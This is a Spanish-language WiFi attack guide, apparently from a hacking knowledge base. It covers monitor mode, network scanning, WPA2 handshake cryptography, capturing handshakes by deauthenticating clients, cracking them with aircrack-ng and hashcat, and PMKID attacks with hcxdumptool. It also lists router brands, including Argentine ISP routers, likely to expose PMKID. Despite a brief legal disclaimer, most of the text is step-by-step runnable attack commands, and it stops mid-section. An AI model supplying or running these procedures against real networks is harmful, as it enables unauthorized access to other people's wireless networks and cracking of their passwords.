## Indice

> ⏱️ **Tiempo estimado:** 25 horas (~5 sesiones) (4954 lineas)


1. [Advertencia Legal](#advertencia-legal)
2. [Hardware WiFi — Requerimientos y Recomendaciones](#hardware-wifi--requerimientos-y-recomendaciones)
3. [Modo Monitor — Drivers y Configuración](#modo-monitor--drivers-y-configuracion)
4. [Channel Hopping y Selección de Banda](#channel-hopping-y-seleccion-de-banda)
5. [Escaneo de Redes](#escaneo-de-redes)
6. [El Handshake WPA/WPA2 — Análisis Criptográfico Completo](#el-handshake-wpawpa2--analisis-criptografico-completo)
7. [Captura de Handshake WPA/WPA2](#captura-de-handshake-wpawpa2)
8. [Cracking de Handshake](#cracking-de-handshake)
9. [PMKID Attack — Análisis Detallado](#pmkid-attack--analisis-detallado)
10. [WPA3/SAE — Análisis Profundo](#wpa3sae--analisis-profundo)
11. [WPA3-Enterprise (802.1X/EAP) — Ataque Detallado](#wpa3-enterprise-8021xeap--ataque-detallado)
12. [WPA2-Enterprise Attack](#wpa2-enterprise-attack)
13. [WPS Attack](#wps-attack)
14. [WEP Attacks (Redes Legado)](#wep-attacks-redes-legado)
15. [Ataques Avanzados](#ataques-avanzados)
16. [Evil Twin Attack](#evil-twin-attack)
17. [EAPOL Frame Analysis](#eapol-frame-analysis)
18. [Ataques a Drones/UAV WiFi](#ataques-a-dronesuav-wifi)
19. [Enterprise Wireless Security Testing](#enterprise-wireless-security-testing)
20. [Automatización con Herramientas Todo-en-Uno](#automatizacion-con-herramientas-todo-en-uno)
21. [Desautenticación (Deauth Attack) — Técnicas Avanzadas](#desautenticacion-deauth-attack--tecnicas-avanzadas)
22. [Beacon Flood — Saturación de APs Falsos](#beacon-flood--saturacion-de-aps-falsos)
23. [Wardriving y GPS Mapping](#wardriving-y-gps-mapping)
24. [MIMO, Frame Aggregation y Problemas Técnicos](#mimo-frame-aggregation-y-problemas-tecnicos)
25. [2.4GHz vs 5GHz — Diferencias Prácticas](#24ghz-vs-5ghz--diferencias-practicas)
26. [Consideraciones Legales por País](#consideraciones-legales-por-pais)
27. [RF Hardware y Antenas — Guía Completa](#rf-hardware-y-antenas--guia-completa)
28. [Captive Portal Exploitation — Técnicas Avanzadas](#captive-portal-exploitation--tecnicas-avanzadas)

---
# Ataques WiFi — Guía Completa

## Advertencia Legal

Todo lo que está acá es **exclusivamente para fines educativos** o para auditar [redes](../raw/r3d3s-f0nd4m3nt0s.md) de las que tenés autorización por escrito. Meterte en [redes](../raw/r3d3s-f0nd4m3nt0s.md) ajenas es delito en casi todos los países (Ley de Delitos Informáticos 26.904 en Argentina, Computer Fraud and Abuse Act en USA, etc.). No seas boludo, no hagas pelotudeces.

---

## Hardware [wifi](../raw/w1f1-4tt4cks.md) — Requerimientos y Recomendaciones

No cualquier placa WiFi sirve para hacer ataques. Necesitás una que soporte **modo monitor** e **inyección de paquetes**.

### Lo que funciona bien (comprobado)

| Chipset | Modelos | Modo Monitor | Inyección | 5GHz | Notas |
|---------|---------|:---:|:---:|:---:|-------|
| **Atheros AR9271** | TP-Link TL-WN722N v1 | ✅ | ✅ | ❌ | El más recomendado para empezar |
| **Ralink RT3070** | Alfa AWUS036NH | ✅ | ✅ | ❌ | Buen alcance, antena externa |
| **Realtek RTL8812AU** | Alfa AWUS036ACH | ✅ | ✅ | ✅ | El mejor para 5GHz |
| **Realtek RTL8814AU** | Alfa AWUS1900 | ✅ | ✅ | ✅ | 4 antenas, monstruo |
| **MediaTek MT7610U** | Panda PAU06 | ✅ | ✅ | ✅ | Chico, potente |
| **Intel AX200/AX210** | Integrada laptop | ✅ | ✅ | ✅ | Con drivers iwlwifi |

### Chips que EVITAR

- **Broadcom** (la mayoría): modo monitor roto o muy limitado
- **Realtek RTL8188CU**: inyección inestable
- **Chips USB genéricos chinos**: no comprar, son basura

### Recomendaciones por uso

- **Principiante**: TP-Link TL-WN722N v1 (versión 1, las nuevas v3/v4 tienen chip Realtek que no sirve). Conseguilo usado.
- **Profesional**: Alfa AWUS036ACH (RTL8812AU) — 2.4 + 5GHz, antena desmontable, inyección perfecta.
- **Portátil ([raspberry pi](../raw/ph7s1c4l-r3d.md#raspberry-pi-p4wn)))**: Panda PAU06 — consume poco, funciona en ARM.
- **Wardriving**: Alfa AWUS1900 con antena omnidireccional de 9dBi.

### Verificar Hardware

```bash
# Ver chipset
lsusb
lsusb -t  # Árbol USB

# Ver interfaces WiFi
iwconfig
ip link

# Ver capacidades (modo monitor, frecuencias)
iw phy phy0 info | grep -E "Band|monitor|Supported"
```

---

## Modo Monitor — Drivers y Configuración

El modo monitor permite capturar todos los paquetes [wifi](../raw/w1f1-4tt4cks.md) del aire sin estar asociado a ninguna [red](../raw/r3d3s-f0nd4m3nt0s.md). Es el modo base para cualquier ataque.

### Con [aircrack-ng](../raw/w1f1-4tt4cks.md#aircrack-ng) (la forma clásica)

```bash
# Ver interfaces disponibles
airmon-ng

# Matar procesos que interfieren (NetworkManager, wpa_supplicant)
airmon-ng check kill

# Activar modo monitor
airmon-ng start wlan0

# Verificar
iwconfig
# La interfaz ahora se llama wlan0mon

# Volver a managed (modo normal)
airmon-ng stop wlan0mon
systemctl restart NetworkManager
```

### Con iw (más directo, sin airmon-ng)

```bash
# Bajar interfaz
ip link set wlan0 down

# Cambiar modo
iw dev wlan0 set type monitor

# Subir interfaz
ip link set wlan0 up

# Verificar
iw dev wlan0 info

# Para volver a managed:
ip link set wlan0 down
iw dev wlan0 set type managed
ip link set wlan0 up
```

### Problemas Comunes de Drivers

**Realtek RTL8812AU en Kali reciente:**

```bash
# Instalar driver
apt install realtek-rtl88xxau-dkms
modprobe 88XXau

# Si no funciona, compilar manual:
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au
make
make install
modprobe 88XXau
```

**Intel AX200 (iwlwifi) — modo monitor limitado:**

```bash
# Algunas versiones de iwlwifi no soportan inyección en 5GHz
# Verificar soporte:
iw list | grep "Supported interface modes"
# Debe mostrar "monitor"

# Solución: deshabilitar ciertas features del firmware
echo "options iwlwifi power_save=0" > /etc/modprobe.d/iwlwifi.conf
modprobe -r iwlmvm && modprobe -r iwlwifi
modprobe iwlwifi && modprobe iwlmvm
```

**Error "No such device":**
- El [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) no cargó
- Solución: `lsusb` para ver si el sistema reconoce el adaptador, después `modprobe` el driver correcto

**Error "Operation not supported" al setear monitor:**
- El chipset no soporta monitor mode
- Solución: comprar otro adaptador

---

## Channel Hopping y Selección de Banda

Las [redes](../raw/r3d3s-f0nd4m3nt0s.md) [wifi](../raw/w1f1-4tt4cks.md) funcionan en distintas frecuencias:

- **2.4 GHz**: Canales 1-14. Menos velocidad, más alcance, más interferencia.
- **5 GHz**: Canales 36-165. Más velocidad, menos alcance, menos interferencia.
- **6 GHz (WiFi 6E)**: Canales 1-233. Muy nuevo, soporte limitado.

### Fijar Canal

```bash
# En modo monitor con airmon-ng
airodump-ng -c 6 wlan0mon           # Escuchar solo canal 6
airodump-ng -c 1-13 wlan0mon        # Escanear canales específicos

# Con iw
iw dev wlan0mon set channel 6
iw dev wlan0mon set channel 149 HT40+  # 5GHz específico
```

### Channel Hopping (Saltar entre canales)

```bash
# Por defecto airodump-ng salta entre canales automáticamente
airodump-ng wlan0mon

# Controlar velocidad de hopping (en ms)
airodump-ng --channel 1-13 --band bg --channel-timeout 500 wlan0mon

# Fijar ancho de banda
airodump-ng --band abg wlan0mon  # 2.4 + 5 GHz
airodump-ng --band a wlan0mon    # Solo 5GHz
airodump-ng --band bg wlan0mon   # Solo 2.4GHz
```

### Por qué es importante fijar canal

Cuando hacés channel hopping, te perdés paquetes en los otros canales mientras escuchás en uno. Para capturar un [handshake](../raw/w1f1-4tt4cks.md#handshake) necesitás estar en el canal exacto del AP. Por eso primero escaneás, ves en qué canal está el objetivo, y después te fijás en ese canal.

---

## Escaneo de [redes](../raw/r3d3s-f0nd4m3nt0s.md)

### Airodump-ng (El clásico)

```bash
# Escaneo básico
airodump-ng wlan0mon

# Escaneo detallado (guardando)
airodump-ng -w captura --output-format pcap,csv,kismet wlan0mon

# Escaneo por banda y canal
airodump-ng --band a -c 36,40,44,48 wlan0mon     # Solo 5GHz canales específicos
airodump-ng --band bg --channel 1-13 wlan0mon     # Solo 2.4GHz

# Escaneo con filtro BSSID
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

### Kismet (Pasivo, más sigiloso)

Kismet es pasivo: no envía paquetes, solo escucha. Ideal para evadir detección.

```bash
# Iniciar
kismet -c wlan0mon

# Interfaz web (Kismet moderno)
# Abrir http://localhost:2501 en el navegador

# Guardar captura
# File → Save

# Kismet también detecta redes ocultas (cloaked SSIDs)
```

### [tcpdump](../raw/r3d3s-f0nd4m3nt0s.md#tcpdump) + [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark) (Análisis manual)

```bash
# Capturar paquetes WiFi
tcpdump -i wlan0mon -w captura.pcap

# Ver EAPOL (handshake) en vivo
tcpdump -i wlan0mon -e -vv -s 0 'ether proto 0x888e'

# Abrir en Wireshark para análisis visual
wireshark captura.pcap
# Filtrar: eapol
# Filtrar: wlan.fc.type_subtype == 0x08  (beacons)
# Filtrar: wlan.fc.type_subtype == 0x0c  (deauth)
```

---

## El [handshake](../raw/w1f1-4tt4cks.md#handshake) WPA/[wpa2](../raw/w1f1-4tt4cks.md#wpa2) — Análisis Criptográfico Completo

### El 4-Way Handshake en Detalle

Cuando un cliente se conecta a una [red](../raw/r3d3s-f0nd4m3nt0s.md) WPA/WPA2-PSK, ocurre el siguiente intercambio después de la autenticación 802.11 (Association/Reassociation):

```
Cliente (Supplicant)                AP (Authenticator)
   |                                     |
   | <--- (M1) EAPOL-Key (ANonce) ------|
   |       - Descriptor Type: 0x02
   |       - Key Info: Pairwise+Install
   |       - Key Nonce: 32 bytes aleatorios (ANonce)
   |       - Key Replay Counter: 1
   |       - Key Data: RSN Information Element
   |                                     |
   | ---- (M2) EAPOL-Key (SNonce+MIC) ->|
   |       - Descriptor Type: 0x02
   |       - Key Info: Pairwise
   |       - Key Nonce: 32 bytes aleatorios (SNonce)
   |       - Key MIC: HMAC-SHA1[KCK](EAPOL-Key M2)
   |       - Key Replay Counter: 1
   |       - Key Data: RSNIE + (opcional PMKID)
   |                                     |
   | <--- (M3) EAPOL-Key (GTK+MIC) -----|
   |       - Key Info: Pairwise+Install+ACK
   |       - Key MIC: HMAC-SHA1[KCK](EAPOL-Key M3)
   |       - Key Data: GTK + RSNIE
   |       - Key Replay Counter: 2
   |                                     |
   | ---- (M4) EAPOL-Key (ACK) -------->|
   |       - Key Info: Pairwise
   |       - Key MIC: HMAC-SHA1[KCK](EAPOL-Key M4)
   |       - Key Replay Counter: 2
```

### Jerarquía de Claves (Key Hierarchy)

```
Passphrase (8-63 caracteres ASCII)
     |
     v
PBKDF2-SHA1(Passphrase, SSID, 4096 iteraciones, 256 bits)
     |
     v
   PMK (Pairwise Master Key) — 256 bits
     |
     +-- PRF-384(PMK, "Pairwise key expansion", 
     |     Min(MAC_AP, MAC_STA) + Max(MAC_AP, MAC_STA) +
     |     Min(ANonce, SNonce) + Max(ANonce, SNonce))
     |
     v
   PTK (Pairwise Transient Key) — 384 bits (CCMP) o 512 bits (TKIP)
     |
     +-- KCK (Key Confirmation Key) — 128 bits — para MIC
     +-- KEK (Key Encryption Key) — 128 bits — para cifrar GTK en M3
     +-- TK (Temporal Key) — 128 bits — para cifrar datos (CCMP)
     +-- (solo TKIP) MIC TX/RX Keys — 64 bits cada una

   GTK (Group Temporal Key) — 256 bits
     |
     +-- GEK (Group Encryption Key) — 128 bits
     +-- GIK (Group Integrity Key) — 128 bits (solo TKIP)
```

### PRF (Pseudo-Random Function) en Detalle

La función PRF se define en IEEE 802.11-2016:

```
PRF(PMK, label, contexto, longitud_salida) {
    resultado = ""
    for i = 0 to (longitud_salida + 159) / 160:
        resultado += HMAC-SHA1(PMK, label + 0x00 + contexto + i)
    return primeros(longitud_salida, resultado)
}

Para PTK:
  label = "Pairwise key expansion"
  contexto = Min(MAC_AP, MAC_CLIENT) + Max(MAC_AP, MAC_CLIENT) + 
             Min(ANonce, SNonce) + Max(ANonce, SNonce)
  salida = 384 bits (48 bytes)
```

### MIC (Message Integrity Code) — Verificación

El MIC protege los mensajes EAPOL-Key M2, M3 y M4. Se calcula:

```
MIC = HMAC-SHA1[KCK](Mensaje_EAPOL_Key_con_MIC_en_ceros)

// El campo MIC en el paquete se pone en 0x00*16 antes de calcular
// Después del cálculo, se copia el resultado al campo MIC
```

Para crackear, se toma M2 (o M3), se pone MIC en 0, se calcula HMAC-SHA1 con KCK derivado de la passphrase candidata, y se compara con el MIC capturado.

### ANonce y SNonce — Generación y Aleatoriedad

El ANonce lo genera el AP, el SNonce lo genera el cliente:

```bash
# Tamaño: 32 bytes c/u (256 bits)
# Deberían ser criptográficamente aleatorios
# Pero algunos APs usan generadores débiles (PRNG basados en tiempo)

# Extraer ANonce/SNonce de una captura
tshark -r handshake.cap -Y "eapol" -T fields \
  -e eapol.keydes.key_nonce \
  -e wlan.sa

# Analizar entropía del ANonce
# Si los nonces son predecibles, podés derivar PTK sin la passphrase
```

### EAPOL-Key Frame — Byte a Byte

```
Offset  Campo                        Tamaño    Descripción
------  -----                        ------    -----------
0-1     Ethernet Type                2         0x888E (EAPOL)
2       Protocol Version             1         0x02 (2004), 0x03 (2009)
3       Packet Type                  1         0x03 (EAPOL-Key)
4-5     Packet Body Length           2         Longitud del cuerpo
6       Descriptor Type              1         0x01 = RC4 (WEP/TKIP)
                                              0x02 = AES (CCMP/GCMP)
                                              0x04 = AKM-defined (WPA3)
7-8     Key Info                     2         Flags:
                                              Bit 0: Key Descriptor Version
                                              Bit 1: Key Type (0=Group, 1=Pairwise)
                                              Bit 2: Install
                                              Bit 3: Key ACK
                                              Bit 4: Key MIC
                                              Bit 5: Secure
                                              Bit 6: Key Error
                                              Bit 7: Key Request
                                              Bit 8: Encrypted Key Data
                                              Bit 9: SMK Message
Bit 10: Key MIC Length
9-10    Key Length                   2         16 para CCMP, 32 para TKIP
11-18   Key Replay Counter           8         Secuencia para prevenir replay
19-50   Key Nonce                    32        ANonce (M1) o SNonce (M2)
51-66   Key IV                       16        Inicialización (TKIP)
67-74   Key RSC                      8         Receive Sequence Counter
75-82   Key ID (Reserved)            8         Identificador (no usado en WPA2)
83-98   Key MIC                      16        Integrity Check Value
99-106  Key Data Length              2         Longitud de datos empaquetados
107+    Key Data                     Variable   GTK, PMKID, RSNIE, etc.
```

```bash
# Analizar EAPOL-Key con tshark
tshark -r handshake.cap -Y "eapol" -T fields \
  -e eapol.keydes.type \
  -e eapol.keydes.key_info \
  -e eapol.keydes.key_len \
  -e eapol.keydes.replay_counter
```

### Cálculo Manual del MIC (Verificación)

```bash
# Extraer M2 de la captura
tshark -r handshake.cap -Y "eapol.keydes.key_info == 0x010a" -x

# Usar python para verificar manualmente:
python3 -c "
import hmac, hashlib, binascii

# Parámetros del handshake
passphrase = 'password123'
ssid = b'MiRed'
ap_mac = binascii.unhexlify('aabbccddeeff'.lower())
client_mac = binascii.unhexlify('112233445566'.lower())
anonce = binascii.unhexlify('...hex del anonce...')
snonce = binascii.unhexlify('...hex del snonce...')

# Derivar PMK
pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid, 4096, 32)

# Derivar PTK
def PRF(key, label, context, length):
    result = b''
    for i in range((length + 159) // 160):
        hmac_input = label + b'\x00' + context + bytes([i])
        result += hmac.new(key, hmac_input, hashlib.sha1).digest()
    return result[:length]

context = min(ap_mac, client_mac) + max(ap_mac, client_mac) + \
          min(anonce, snonce) + max(anonce, snonce)
ptk = PRF(pmk, b'Pairwise key expansion', context, 48)

kck = ptk[:16]  # Key Confirmation Key
kek = ptk[16:32]  # Key Encryption Key
tk = ptk[32:48]   # Temporal Key

print(f'PMK: {pmk.hex()}')
print(f'KCK: {kck.hex()}')
print(f'KEK: {kek.hex()}')
print(f'TK:  {tk.hex()}')
"
```

### WPA2 vs WPA3 — Diferencias en Derivación

| Aspecto | WPA2-PSK | WPA3-SAE |
|---------|----------|----------|
| Obtención de PMK | PBKDF2-SHA1(Passphrase, SSID, 4096) | SAE handshake DH (sin PSK directa) |
| PTK derivación | PRF-384(PMK, "Pairwise key expansion", MACs+Nonces) | PRF-384(PMK, "Pairwise key expansion", MACs+Nonces) |
| MIC algoritmo | HMAC-SHA1-128 | HMAC-SHA256 (CMAC en algunos) |
| Key descriptor | 0x02 ([aes](../raw/crypt0-f0r-h4ck3rs.md#aes)) | 0x04 (AKM-defined) |
| Anti-clogging | No | Sí (tokens PoW) |
| Forward secrecy | No (PSK es estática) | Sí (DH efímero) |

### El GTK (Group Temporal Key) y Su Distribución

El GTK es compartido por todos los clientes del AP para tráfico broadcast/multicast:

```
GTK = PRNG(AP, GMK)  // GMK = Group Master Key

// En M3, el GTK va cifrado con KEK:
GTK_cifrado = AES-128-WRAP(KEK, GTK)

// El cliente descifra:
GTK = AES-128-WRAP-UNWRAP(KEK, GTK_cifrado)
```

El GTK cambia cuando un cliente se desconecta (para evitar que el cliente anterior siga escuchando broadcast).

### Key Replay Counter — Prevención de Replay

Cada EAPOL-Key tiene un contador que debe incrementarse:
- M1: counter = 1 (o cualquier número, depende del AP)
- M2: counter = mismo que M1
- M3: counter = M1 + 1
- M4: counter = mismo que M3

Si un atacante replaya un M1 viejo, el cliente lo ignora porque el replay counter no es mayor al último visto.

---

## Captura de [handshake](../raw/w1f1-4tt4cks.md#handshake) WPA/[wpa2](../raw/w1f1-4tt4cks.md#wpa2)

### Paso 1: Escanear

```bash
# Ver redes disponibles
airodump-ng wlan0mon

# Anotá:
# - BSSID del objetivo
# - Canal (CH)
# - Si tiene clientes conectados (STATION)
```

### Paso 2: Escuchar en el canal específico

```bash
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
```

### Paso 3: Forzar reconexión (si no hay handshake)

Si no ves "WPA handshake" en la parte de arriba a la derecha, mandá deauth:

```bash
# Deauth a un cliente específico (más efectivo)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Deauth broadcast (funciona si los clientes aceptan broadcast deauth)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Más paquetes si no funciona
aireplay-ng -0 20 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Paso 4: Verificar el handshake

```bash
# Con aircrack-ng
aircrack-ng handshake-01.cap | grep "WPA"

# Con aircrack-ng (más detalle)
aircrack-ng -a 2 -w /dev/null handshake-01.cap

# Con tshark (contar paquetes EAPOL)
tshark -r handshake-01.cap -Y "eapol" | wc -l
# Si da 4 o más, tenés el handshake completo
```

### Si no aparece el handshake

1. **No hay clientes conectados**: no podés capturar handshake con deauth porque si no hay nadie conectado, no tenés a quien deautenticar. Probá PMKID attack (más abajo).
2. **Channel hopping**: asegurate de estar fijo en el canal del AP.
3. **Antena/alcance**: si estás muy lejos, los paquetes no llegan bien. Acercate.
4. **MAC filtering**: el AP puede tener filtrado MAC, pero eso no afecta la captura.
5. **Cliente no se reconecta rápido**: probá mandar más deauths, o esperar más tiempo.

---

## [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) de [handshake](../raw/w1f1-4tt4cks.md#handshake)

### Con [aircrack-ng](../raw/w1f1-4tt4cks.md#aircrack-ng) (CPU)

```bash
# Usando wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Especificando el AP (si hay varios en el archivo)
aircrack-ng -w passwords.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap

# Modo silencioso (solo muestra cuando encuentra)
aircrack-ng -w wordlist.txt -q handshake-01.cap
```

Rendimiento: ~200-2000 contraseñas/segundo en CPU. Una wordlist de 14GB de rockyou puede llevar horas o días.

### Con [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat) (GPU — MUCHO más rápido)

```bash
# Convertir captura a formato hashcat
hcxpcapngtool handshake-01.cap -o handshake.hc22000

# O con hcxpcaptool (herramienta más vieja)
hcxpcaptool -z handshake.22000 handshake-01.cap

# Ver el hash (formato: hash:PMKID:MAC_AP:MAC_CLIENT:ESSID)
cat handshake.hc22000

# Cracking con wordlist (modo 22000 = WPA/WPA2 PMKID + handshake)
hashcat -m 22000 handshake.hc22000 rockyou.txt

# Cracking con ataque de máscara (brute force)
hashcat -m 22000 handshake.hc22000 -a 3 ?d?d?d?d?d?d?d?d
# ?d = dígito, 8 dígitos = 100 millones de combinaciones

# Brute force: 8 letras minúsculas
hashcat -m 22000 handshake.hc22000 -a 3 ?l?l?l?l?l?l?l?l

# Reglas de transformación (combinar palabra + número)
hashcat -m 22000 handshake.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Rule combinatoria (palabra + palabra)
hashcat -m 22000 handshake.hc22000 -a 1 wordlist1.txt wordlist2.txt

# Mostrar progreso
hashcat -m 22000 handshake.hc22000 rockyou.txt --status-timer=5 --status

# Si la contraseña es larga/compleja, probablemente no la saques
```

Rendimiento en GPU moderna (RTX 4090): ~1-2 millones de contraseñas/segundo.

### Formatos de [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) y modos de hashcat

| Modo | Tipo | Descripción |
|------|------|-------------|
| 22000 | WPA/[wpa2](../raw/w1f1-4tt4cks.md#wpa2) PMKID + EAPOL | El más usado hoy |
| 2500 | WPA/WPA2 Handshake (viejo) | Deprecated |
| 16100 | WPA3-SAE | Para [redes](../raw/r3d3s-f0nd4m3nt0s.md) WPA3 |
| 16800 | WPA-PMKID-PBKDF2 | Alternativo |
| 16801 | WPA-PMKID-PMK | Para ataques avanzados |

### Optimización de hashcat

```bash
# Usar GPU
hashcat -m 22000 -d 1 handshake.hc22000 rockyou.txt

# Ver dispositivos disponibles
hashcat -I

# Modo de potencia
hashcat -m 22000 -w 4 handshake.hc22000 rockyou.txt
# -w 1 = baja, -w 4 = alta (puede congelar la PC)

# Session management (continuar después de parar)
hashcat -m 22000 handshake.hc22000 rockyou.txt --session sesion1
# Parar con 's', reanudar con --restore
hashcat --session sesion1 --restore
```

---

## PMKID Attack — Análisis Detallado

El PMKID attack es genial porque **no necesita clientes conectados**. Ataca directamente al AP. Fue descubierto públicamente por Atom ([hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat)) en 2018 y cambió el juego del pentesting [wifi](../raw/w1f1-4tt4cks.md).

### Cómo Funciona — Derivación Matemática

El PMKID es un campo opcional del elemento RSN (Robust Security Network) que algunos routers incluyen en el primer mensaje EAPOL-Key (M1) durante el 4-Way [handshake](../raw/w1f1-4tt4cks.md#handshake):

```
PMKID = HMAC-SHA1(PMK, "PMK Name" + MAC_AP + MAC_STA)
       = HMAC-SHA1(PMK, 0x00 0x50 0x46 0x4D 0x4B 0x4E 0x61 0x6D 0x65 0x00 + MAC_AP + MAC_STA)
       = HMAC-SHA1(PMK, "PMK Name" + BSSID + STA_MAC)
```

Donde:
- **"PMK Name"** es el string literal `0x00504d4b4e616d65` ("PMKName" en hex)
- **MAC_AP**: BSSID del Access Point (6 bytes)
- **MAC_STA**: MAC del cliente que se asocia (6 bytes)
- **PMK**: PBKDF2-SHA1(Passphrase, SSID, 4096, 256)

La clave está en que el atacante puede mandar un Association Request con una MAC falsa (la que quiera), el AP responde con EAPOL-Key M1 que contiene el PMKID calculado con ESA MAC. **El atacante controla la MAC del "cliente"**, así que sabe todos los inputs menos la passphrase.

### Por Qué No Necesita un Cliente Conectado

En el ataque tradicional necesitás un cliente real que se conecte para capturar SNonce + MIC. En PMKID:

1. El atacante crea un Association Request con MAC aleatoria (o la que quiera)
2. El AP responde con M1 conteniendo PMKID = HMAC-SHA1(PMK, "PMKName" + MAC_AP + MAC_ALEATORIA)
3. El atacante extrae PMKID del M1
4. No necesita SNonce, no necesita MIC, no necesita cliente real
5. Solamente necesita verificar: PMKID == HMAC-SHA1(PMK_candidato, "PMKName" + AP_MAC + CLIENT_MAC)

### Formato del [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) PMKID (modo 22000 de hashcat)

```
WPA*01*PMKID*MAC_AP*MAC_STA*ESSID
```

Ejemplo:
```
WPA*01*4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d*112233445566*aabbccddeeff*MiRed
```

Comparado con el formato de handshake:
- Handshake (también modo 22000): incluye ANonce, SNonce, MIC, etc.
- PMKID: solo PMKID + MACs + ESSID — mucho más compacto

### Captura con hcxdumptool — Opciones Avanzadas

```bash
# Captura básica (recomendada para empezar)
hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1

# Captura filtrada por banda de frecuencia
hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1 -f 2400:2500  # 2.4GHz
hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1 -f 5000:6000  # 5GHz

# Captura de un AP específico
hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1 -d AA:BB:CC:DD:EE:FF

# Solo PMKID (sin ataques a clientes)
hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1 --disable_client_attacks

# Con filtrado por ESSID
hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1 -t RedObjetivo

# Modo agresivo (más association requests por segundo)
hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1 -r 100

# Con filtro de paquetes para reducir ruido
hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1 --bp 0  # Beacons por defecto

# Ver APs que responden con PMKID (status muestra en vivo)
# La columna "PMKID" muestra cuántos APs dieron PMKID
hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=2  # Más verbose
```

### Flags de hcxdumptool Explicados

```
--enable_status=0     Sin status (silencioso)
--enable_status=1     Status básico (recomendado)
--enable_status=2     Status detallado (muestra cada PMKID que llega)
--enable_status=3     Debug
-r N                  Rate limit: N association requests por segundo
-d BSSID              Target AP específico
-t ESSID              Target por nombre de red
-f min:max            Frecuencia en MHz
--bp N                Beacons por paquete (0 = no filtrar)
--disable_client_attacks   No mandar deauth a clientes
--disable_attacks     Modo solo escucha (no manda nada)
```

### Extraer Hashes PMKID

```bash
# hcxpcapngtool (nuevo) — convierte pcapng a formato hashcat
hcxpcapngtool captura.pcapng -o pmkid.22000

# hcxpcaptool (viejo) — mismo propósito
hcxpcaptool -z pmkid.22000 captura.pcapng

# Si querés ver qué contiene:
cat pmkid.22000
# WPA*01*4a5b6c7d8e9f...*mac_ap*mac_sta*SSID

# Ver cuántos PMKID capturaste
wc -l pmkid.22000
```

### Troubleshooting — PMKID No Aparece

Si no capturás ningún PMKID:

```
1. El router no soporta PMKID en M1
   Solución: probá con otro router, no todos lo implementan

2. hcxdumptool no envía Association Requests (modo pasivo)
   Solución: no usés --disable_attacks, o --disable_client_attacks sin ataque

3. Señal demasiado débil
   Solución: acercate al AP o usá antena direccional
   Verificar RSSI: el AP debe marcar mejor de -75 dBm en airodump

4. Channel hopping
   Solución: primero escaneá con airodump-ng para encontrar el canal exacto
   después usá hcxdumptool en ese canal:
   iw dev wlan0mon set channel 6

5. El AP usa 802.11w (PMF) obligatorio
   Solución: hcxdumptool puede no recibir M1 si el AP exige PMF en association

6. El AP tiene filtrado MAC
   Solución: no importa, hcxdumptool puede usar cualquier MAC

7. Antena/Driver no soporta inyección en esa frecuencia
   Solución: verificar con aireplay-ng -9 wlan0mon
```

### Verificar en Tiempo Real

```bash
# Mientras hcxdumptool corre, verificá con tshark si aparece PMKID:
tshark -i wlan0mon -Y "wlan.rsn.pmkid" 2>/dev/null

# O contá los PMKID en la captura:
while true; do
  clear
  echo "PMKIDs capturados:"
  hcxpcaptool -z /dev/stdout captura.pcapng 2>/dev/null | wc -l
  sleep 5
done
```

### PMKID vs Handshake — Comparación de Velocidad de [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas)

```bash
# Benchmark hashcat para modo 22000
hashcat -m 22000 -b
# Resultados típicos:
# - RTX 4090: ~2.5 MH/s (2.5 millones por segundo)
# - RTX 3080: ~1.8 MH/s
# - RTX 2080: ~800 kH/s
# - CPU (16 cores): ~20 kH/s

# Tiempo estimado para rockyou.txt (14M contraseñas):
# RTX 4090: 5-6 segundos
# CPU: 10-15 minutos
```

La velocidad es la misma para PMKID y handshake porque ambos usan el mismo modo 22000 de hashcat. La diferencia está en la CAPTURA: PMKID no necesita clientes.

### ¿Qué Routers Exponen PMKID?

La [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) depende del chipset/[firmware](../raw/u3f1-r00tk1ts.md#firmware):

| Fabricante | Chipset | PMKID? | Notas |
|-----------|---------|:------:|-------|
| TP-Link viejos | Atheros/Qualcomm | ✅ | Casi siempre |
| TP-Link modernos | Mediatek/Realtek | ❌ | Desde 2020 no |
| Movistar/Fibertel | Varios (Sagemcom, etc) | ✅ | Comunes |
| Linksys | Broadcom | ❌ | Rara vez |
| D-Link | Atheros/Ralink | ✅ | Depende del modelo |
| Cisco/Enterprise | Varios | ❌ | Muy raro |
| Ubiquiti | Atheros | ✅ | Algunos modelos |
| MikroTik | Varios | ❌ | Generalmente no |
| Mercusys | Mediatek | ❌ | Nuevos no |

En general:
- Routers viejos (pre-2018): alta probabilidad (~70%)
- Routers modernos (2022+): baja probabilidad (~15%)
- ISP routers argentinos: buena probabilidad (Movistar, Claro, Telecentro)

### PMKID en Beacons vs PMKID en EAPOL-Key

Hay dos lugares donde puede aparecer PMKID:
1. **En M1 del 4-Way Handshake** (el que usa hcxdumptool): el AP lo incluye opcionalmente al iniciar el handshake
2. **En el Beacon frame** (raro): algunos APs de Cisco incluyen PMKID en el beacon para fast roaming

```bash
